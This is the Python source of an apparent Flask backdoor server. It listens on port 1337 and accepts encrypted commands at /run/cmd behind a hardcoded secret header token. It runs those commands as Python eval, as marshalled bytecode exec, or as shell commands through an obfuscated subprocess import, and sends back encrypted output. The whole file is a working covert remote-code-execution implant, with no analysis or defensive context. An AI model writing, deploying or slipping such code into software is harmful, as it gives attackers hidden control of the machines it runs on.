from typing import Optional
from flask import Flask, request, jsonify
from functools import wraps
from encryption_utils import decrypt, encrypt
from base64 import b64encode,b64decode
from io import StringIO
from contextlib import redirect_stdout
import marshal
import sys
app = Flask(__name__)
SECRET = 'GreatBackdoorOutThere11'
def secret_header(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.headers.get('X-Auth-Token') and request.headers.get('X-Auth-Token') == SECRET:
                return f(*args, **kwargs)
        return ''
    return decorated_function


def is_python_command(command: str) -> bool:
    return command.startswith('py_run')

def is_byte_code(command: str) -> bool:
    return command.startswith('loadByteCode')

def exec_command(command : str) -> Optional[str]:
    try:
        if is_python_command(command):
            command = command.split('py_run')[1]
            old_stdout = sys.stdout
            sys.stdout = newstdout = StringIO()
            cmd = eval(command)
            ret_val = newstdout.getvalue()
            sys.stdout = old_stdout
            return str(ret_val)
        elif is_byte_code(command):
            command = command.split('loadByteCode')[1].strip()
            command = b64decode(command)
            stdout = StringIO()
            with redirect_stdout(stdout):
               exec(marshal.loads(command))
            return stdout.getvalue()
            
        stdout_pipe = globals()['__builtins__'].__import__('subprocess').PIPE
        process = globals()['__builtins__'].__import__('subprocess').Popen(command,shell=True, stdout=stdout_pipe,stderr = stdout_pipe)
        out,err = process.communicate()
        if err and not out:
            return err.decode()
        return out.decode()
    except Exception as e:
        return e

@app.post('/run/cmd')
@secret_header
def run():
    cmd = request.json.get('data')
    if not cmd:
        return ''
    try:
        cmd = decrypt(b64decode(cmd), SECRET)
        random_key = cmd[0:8].strip().replace(' ','')
        cmd_results = exec_command(cmd)
        data = {'results' : b64encode(encrypt(cmd_results, random_key)).decode()}
        return jsonify(data)
    except ValueError as e:
        print(e)
        return ''
  

app.run('0.0.0.0',1337)